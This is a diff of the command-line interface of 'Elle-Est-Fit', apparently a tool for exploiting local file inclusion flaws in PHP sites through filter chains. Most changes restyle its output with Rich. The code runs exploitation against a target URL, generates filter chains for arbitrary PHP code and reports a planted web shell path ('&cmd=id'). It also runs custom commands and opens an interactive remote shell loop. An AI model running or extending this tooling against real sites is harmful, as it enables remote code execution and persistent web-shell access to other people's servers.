@@ -11,22 +11,48 @@ import traceback
 from typing import Callable, Optional
 import textwrap
 
+from rich.console import Console
+from rich.logging import RichHandler
+from rich.theme import Theme
+from rich.panel import Panel
+
 from . import __version__
 from .core import LFI, info
 from .exceptions import ElleEstFitError
 
+# Create a custom theme for Rich
+custom_theme = Theme({
+    "info": "cyan",
+    "warning": "yellow",
+    "error": "bold red",
+    "success": "bold green",
+    "shell": "green",
+    "command": "bold blue",
+    "output": "bright_white",
+})
+
+# Create a console with the custom theme
+console = Console(theme=custom_theme)
+
+# Configure logger
 logger = logging.getLogger("elle-est-fit")
 
 
 def setup_logging(verbose: bool = False):
     """Configure logging based on verbosity level."""
     log_level = logging.DEBUG if verbose else logging.INFO
-    log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-    logging.basicConfig(level=log_level, format=log_format)
+    
+    # Set up Rich logging
+    logging.basicConfig(
+        level=log_level,
+        format="%(message)s",
+        datefmt="[%X]",
+        handlers=[RichHandler(rich_tracebacks=True, console=console)]
+    )
     
     # Print a message to verify logging is working
     if verbose:
-        print("[*] Verbose logging enabled")
+        console.print("[info]Verbose logging enabled[/info]")
 
 
 def parse_args():
@@ -44,7 +70,6 @@ def parse_args():
     )
     
     parser.add_argument('--version', action='version', version=f'Elle-Est-Fit v{__version__}')
-    parser.add_argument('--test-chain', help='Test a specific PHP filter chain against the target URL')
     
     # Target options
     target_group = parser.add_argument_group('Target')
@@ -55,6 +80,7 @@ def parse_args():
     technique_group.add_argument('--technique', help='Specific technique to use (default: auto-detect)')
     technique_group.add_argument('--list-techniques', action='store_true', help='List available techniques')
     technique_group.add_argument('--dump-chain', help='Generate and dump a PHP filter chain for the given PHP code')
+    technique_group.add_argument('--test-chain', help='Test a specific PHP filter chain against the target URL')
     
     # Encoding options
     encoding_group = parser.add_argument_group('Encoding')
@@ -82,8 +108,8 @@ def list_available_techniques():
     import importlib
     from .techniques.base import TechniqueBase
     
-    print("Available techniques:")
-    print("---------------------")
+    console.print("Available techniques:", style="info")
+    console.print("---------------------", style="info")
     
     # Find all modules in the techniques package
     techniques_path = 'elle_est_fit.techniques'
@@ -103,11 +129,11 @@ def list_available_techniques():
                     attr != TechniqueBase):
                     
                     # Print the technique info
-                    print(f"  {attr.name}: {attr.description}")
+                    console.print(f"  [success]{attr.name}[/success]: {attr.description}")
         except (ImportError, AttributeError) as e:
-            print(f"  Error loading {name}: {str(e)}")
+            console.print(f"  Error loading {name}: {str(e)}", style="error")
     
-    print("\nUsage: --technique <technique_name>")
+    console.print("\nUsage: --technique <technique_name>", style="info")
 
 
 def parse_tamper_function(code_str: str) -> Optional[Callable[[str], str]]:
@@ -148,13 +174,13 @@ def interactive_shell(lfi_instance):
     Args:
         lfi_instance: Initialized and exploited LFI instance
     """
-    print("\nStarting interactive shell. Type 'exit' or 'quit' to exit.")
-    print("------------------------------------------------------")
+    console.print("\nStarting interactive shell. Type 'exit' or 'quit' to exit.", style="info")
+    console.print("------------------------------------------------------", style="info")
     
     while True:
         try:
             # Get the command from the user
-            cmd = input("shell> ")
+            cmd = console.input("[shell]shell>[/shell] ")
             
             # Check if the user wants to exit
             if cmd.lower() in ['exit', 'quit', 'q']:
@@ -162,46 +188,52 @@ def interactive_shell(lfi_instance):
                 
             # Execute the command
             if cmd.strip():
-                output = lfi_instance.shell(cmd)
-                print(output)
+                try:
+                    output = lfi_instance.shell(cmd)
+                    console.print(output, style="output")
+                except AttributeError as e:
+                    console.print(f"Error: {str(e)}", style="error")
+                    console.print("The shell method is missing from the LFI class. Please check the core.py file.", style="error")
+                    break
         except KeyboardInterrupt:
-            print("\nExiting interactive shell...")
+            console.print("\nExiting interactive shell...", style="warning")
             break
         except Exception as e:
-            print(f"Error: {str(e)}")
+            console.print(f"Error: {str(e)}", style="error")
 
-    def test_chain(url, chain, verbose=False):
-        """
-        Test a PHP filter chain against a target URL.
+
+def test_chain(url, chain, verbose=False):
+    """
+    Test a PHP filter chain against a target URL.
+    
+    Args:
+        url: Target URL with {} placeholder
+        chain: PHP filter chain to test
+        verbose: Whether to show verbose output
+    """
+    import requests
+    
+    complete_url = url.format(chain)
+    console.print(f"Testing URL: {complete_url}", style="info")
+    
+    try:
+        response = requests.get(complete_url, timeout=10)
+        console.print(f"Response status code: {response.status_code}", 
+                     style="success" if response.status_code == 200 else "warning")
         
-        Args:
-            url: Target URL with {} placeholder
-            chain: PHP filter chain to test
-            verbose: Whether to show verbose output
-        """
-        import requests
-        
-        complete_url = url.format(chain)
-        print(f"Testing URL: {complete_url}")
-        
-        try:
-            response = requests.get(complete_url, timeout=10)
-            print(f"Response status code: {response.status_code}")
+        if response.status_code == 200:
+            console.print("\nResponse content:", style="info")
+            console.print(Panel(response.text[:1000], title="Response Preview", border_style="cyan"))
             
-            if response.status_code == 200:
-                print("\nResponse content:")
-                print("------------------")
-                print(response.text)
-                
-                # Try to detect common success markers
-                detection_markers = ["ELLEESTFIT", "phpinfo", "uid=", "system"]
-                for marker in detection_markers:
-                    if marker in response.text:
-                        print(f"\n[+] Success marker found: '{marker}' at position {response.text.find(marker)}")
-            else:
-                print(f"Request failed with status code: {response.status_code}")
-        except Exception as e:
-            print(f"Error making request: {str(e)}")
+            # Try to detect common success markers
+            detection_markers = ["ELLEESTFIT", "phpinfo", "uid=", "system"]
+            for marker in detection_markers:
+                if marker in response.text:
+                    console.print(f"\n[success]Success marker found:[/success] '{marker}' at position {response.text.find(marker)}")
+        else:
+            console.print(f"Request failed with status code: {response.status_code}", style="error")
+    except Exception as e:
+        console.print(f"Error making request: {str(e)}", style="error")
 
 
 def main():
@@ -223,27 +255,33 @@ def main():
         try:
             from .payloads.filter_chain import generate_filter_chain
             php_code = args.dump_chain
-            print(f"\nGenerating PHP filter chain for: {php_code}")
+            console.print(f"\nGenerating PHP filter chain for: ", end="")
+            console.print(php_code, style="command")
             chain = generate_filter_chain(php_code)
-            print("\nPHP Filter Chain:")
-            print("----------------------------------------")
-            print(chain)
-            print("----------------------------------------")
-            print("Use this chain with your LFI vulnerability")
+            console.print("\nPHP Filter Chain:", style="info")
+            console.print(Panel(chain[:200] + "..." if len(chain) > 200 else chain, 
+                               title="Filter Chain", border_style="cyan"))
+            console.print("\nUse this chain with your LFI vulnerability", style="info")
             return 0
         except Exception as e:
-            print(f"Error generating filter chain: {str(e)}")
+            console.print(f"Error generating filter chain: {str(e)}", style="error")
             if args.verbose:
-                traceback.print_exc()
+                console.print_exception()
             return 1
+    
+    # Handle test-chain
+    if args.test_chain and args.url:
+        url = args.url.replace('FUZZ', '{}')
+        test_chain(url, args.test_chain, args.verbose)
+        return 0
     
     # Check if URL is required but not provided
     if not args.url:
-        print("Error: --url is required unless --list-techniques or --dump-chain is specified")
+        console.print("Error: --url is required unless --list-techniques or --dump-chain is specified", style="error")
         return 1
     
     try:
-        print(f"[*] Targeting: {args.url}")
+        console.print(f"[info]Targeting:[/info] {args.url}")
         
         # Parse the tamper function if provided
         tamper_func = parse_tamper_function(args.tamper) if args.tamper else None
@@ -251,7 +289,7 @@ def main():
         # Normalize URL to replace FUZZ with an empty placeholder
         url = args.url.replace('FUZZ', '{}')
         
-        print("[*] Creating LFI instance...")
+        console.print("[info]Creating LFI instance...[/info]")
         # Create the LFI instance
         lfi = LFI(
             target=url,
@@ -262,20 +300,20 @@ def main():
             custom_cmd=args.custom_cmd,
             verbose=args.verbose
         )
-        print("[*] Note: If you experience HTTP 414 errors (URI Too Long), try shorter payloads")
-        print("[*] Attempting exploitation...")
+        
+        console.print("[warning]Note: If you experience HTTP 414 errors (URI Too Long), try shorter payloads[/warning]")
+        console.print("[info]Attempting exploitation...[/info]")
         # Attempt to exploit
         if lfi.exploit():
-            # lfi.target = http://192.168.215.3/index.php?page={}, so we remove the {} and replace it with the actual path
-            info(f"Exploitation successful! Shell created at {lfi.target.replace('{}', '')+lfi.shell_path}&cmd=id")
-            
+
+            # lfi.target = http://192.168.215.3/index.php?page={}, we remove the {} and concat ?cmd=id
+            console.print(f"[success]Exploitation successful![/success] Shell created at {lfi.target.replace('{}','')+lfi.shell_path}&cmd=id", style="success")
             # Execute the custom command if provided
             if args.custom_cmd:
-                print(f"\n[*] Executing command: {args.custom_cmd}")
+                console.print(f"\n[info]Executing command:[/info] [command]{args.custom_cmd}[/command]")
                 output = lfi.shell()
-                print("\nCommand output:")
-                print("---------------")
-                print(output)
+                console.print("\nCommand output:", style="info")
+                console.print(Panel(output, title="Command Output", border_style="green"))
             
             # Start interactive shell if requested
             if args.interactive:
@@ -283,24 +321,24 @@ def main():
             
             return 0
         else:
-            info("Exploitation failed.")
+            console.print("[error]Exploitation failed.[/error]")
             return 1
             
     except ElleEstFitError as e:
         logger.error(str(e))
-        print(f"Error: {str(e)}")
+        console.print(f"Error: {str(e)}", style="error")
         if args.verbose:
-            traceback.print_exc()
+            console.print_exception()
         return 1
     except KeyboardInterrupt:
         logger.info("Operation interrupted by user.")
-        print("\nOperation interrupted by user.")
+        console.print("\nOperation interrupted by user.", style="warning")
         return 130
     except Exception as e:
         logger.error(f"Unexpected error: {str(e)}")
-        print(f"Unexpected error: {str(e)}")
+        console.print(f"Unexpected error: {str(e)}", style="error")
         if args.verbose:
-            traceback.print_exc()
+            console.print_exception()
         return 1
 
 
